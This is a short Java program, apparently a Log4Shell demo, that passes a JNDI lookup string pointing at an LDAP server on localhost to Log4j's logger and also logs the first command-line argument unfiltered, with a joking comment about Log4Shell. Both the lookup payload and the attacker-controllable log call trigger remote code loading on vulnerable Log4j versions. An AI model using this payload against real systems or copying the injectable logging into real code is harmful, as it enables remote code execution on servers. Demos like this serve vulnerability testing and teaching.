import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
        
        logger.error("Log4Shell? Never heard of it but I do know I need to log this....");
        logger.error(args[0]);
    }
}
